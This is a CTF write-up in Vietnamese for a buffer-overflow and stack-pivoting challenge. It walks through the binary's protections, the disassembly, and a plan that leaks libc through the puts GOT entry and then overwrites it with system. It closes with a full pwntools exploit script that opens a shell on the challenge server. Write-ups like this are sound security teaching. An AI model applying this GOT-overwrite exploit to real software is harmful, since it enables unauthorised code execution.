# BOF + stack pivoting

Kiểm tra các chế độ bảo vệ của chương trình ta có như sau :

![image](https://user-images.githubusercontent.com/93699926/236665571-90cbf9a4-7b0c-493a-8db5-3ccf9a857d21.png)

PIE và RELRO tắt thì nghĩ ngay là tấn công GOT thôi, CANARY cũng tắt sẽ dễ dàng hơn cho việc khai thác.

Kiểm tra luồng thực thi của chương trình qua IDA ta có như sau:

![image](https://user-images.githubusercontent.com/93699926/236665635-a51f60ea-a6d4-4926-95eb-7b6a182f7203.png)

Hàm vuln được thực hiện lại liên tục khi nó đặt trong vòng while_loop.
kiểm tra hàm vuln() ta có như sau:

![image](https://user-images.githubusercontent.com/93699926/236665716-f0bd6942-82f2-451f-852a-3e359c5494a1.png)

Ở đây ta thấy nó cho ta ghi tận 72 bytes vô buf[64] vậy là dư 8 byte ==> chỉ đủ để overwrite saved rbp của vuln, và sau khi hàm vuln trả về hàm main và tiếp tục thực thi câu lệnh kế ==> ta có thể thay đổi được rbp của main.
Nhưng thay đổi được rồi thì làm gì tiếp. đoạn này nếu xem pseuđôce thôi sẽ không thấy ta hãy sang phân tích mã assembly:

![image](https://user-images.githubusercontent.com/93699926/236665846-9496fbd8-205b-4788-9434-2837ec34f47e.png)

Ta thấy sau khi gọi hàm vuln nó sẽ thực hiện đoạn code sau :

```assembly
; lúc này sau khi vừa thực thi hàm vuln thì rax sẽ chứa địa chỉ của chuỗi ta vừa nhập ở hàm vuln
; RAX: 0x12345678 -> "AAAAAA..."
mov     rcx, [rax]        ;  nó sẽ lưu 8byte đầu vô rcx=> rcx="AAAAAAAA"
mov     rbx, [rax+8]      ; rbx="AAAAAAAA" 8 byte tiếp theo
mov     [rbp+var_50], rcx ; nó sẽ lưu RBP +offset var_50
mov     [rbp+var_48], rbx; nó sẽ lưu RBP +offset var_48
mov     rcx, [rax+10h] 
mov     rbx, [rax+18h]
mov     [rbp+var_40], rcx
mov     [rbp+var_38], rbx
mov     rcx, [rax+20h]
mov     rbx, [rax+28h]
mov     [rbp+var_30], rcx
mov     [rbp+var_28], rbx
mov     rdx, [rax+38h]     ; đến đây giống như ở trên thì ta có thể hiểu là nó sẽ coppy 0x40 bytes input của ta vô RBP+var_50
mov     rax, [rax+30h]
mov     [rbp+var_20], rax
mov     [rbp+var_18], rdx
```

kiểm tra stack của main ta có như sau:

![image](https://user-images.githubusercontent.com/93699926/236666165-4de06a6a-c3af-47ae-9693-8dbe21c53cb9.png)

cái giá biến var_50 sẽ mang giá trị là -0x50

Hiểu được luồng thực thi của chương trình thì ta sẽ có hướng khai thác như sau :
# PLAN
Step1: ta sẽ ghi đè biến global message với địa chỉ GOT của hàm nào đó để khi chương trình puts message ta sẽ leak được địa chỉ libc
Step2: ghi đè message với địa chỉ của chuỗi /bin/sh đã khi đã leak được libc
Step3: over write GOT của PUTS thành System

full script in p.py
```python
from pwn import *
context.binary=exe=ELF("./chall_patched",checksec=False)
libc=ELF("./libc.so.6",checksec=False)

#p=process(exe.path)
p=remote("junior-pwner.bsides.shellmates.club",443,ssl=True)
def GDB():
        gdb.attach(p,gdbscript=
                '''
                b*0x0000000000401311
                b*0x0000000000401327
                c
                '''
                )
        input()



#GDB()
rw_section=0x404a00
payload=b"A"*0x10
payload=flat(
        exe.got['puts'],
        exe.got['puts'],
        exe.got['puts'],
        exe.got['puts'],
        exe.got['puts'],
        exe.got['puts'],
        exe.got['puts'],
        exe.got['puts'],
        )
payload+=p64(exe.sym['messages']+0x30)
p.sendafter(b"Your Name:",payload)



leak=int.from_bytes(p.recvuntil(b"Your Name:",drop=True).split(b"\n")[1],"little")
log.info('[+]leak:'+hex(leak))
libc.address=leak-0x80ed0
log.info('[+]libc base:'+hex(libc.address))
log.info('[+]system:'+hex(libc.sym['system']))
payload=flat(
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        next(libc.search(b"/bin/sh")),
        )
payload+=p64(exe.sym['messages']+0x30)
p.send(payload)

print('[+]over writing puts got')
payload=flat(
        libc.sym['system'],
        libc.sym['system'],
        libc.sym['system'],
        libc.sym['system'],
        libc.sym['system'],
        libc.sym['system'],
        libc.sym['system'],
        libc.sym['system'],
        )
payload+=p64(exe.got['rand'])
p.sendafter(b"Your Name:",payload)

p.interactive()
```
 
Chạy chương trình trên sever ta có flag :

![image](https://user-images.githubusercontent.com/93699926/236666441-66557853-3ebe-41a0-9cf0-e3d4520597c9.png)


